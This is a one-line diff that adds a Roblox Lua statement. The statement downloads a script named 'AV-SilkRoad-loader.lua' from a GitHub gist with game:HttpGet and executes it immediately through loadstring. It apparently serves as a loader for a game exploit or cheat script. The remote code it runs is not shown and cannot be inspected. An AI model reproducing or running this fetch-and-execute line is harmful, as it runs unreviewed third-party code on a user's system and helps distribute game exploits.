@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/abirvoid/f7bd92bbe501417bf33a6ba4cd400095/raw/AV-SilkRoad-loader.lua",true))()
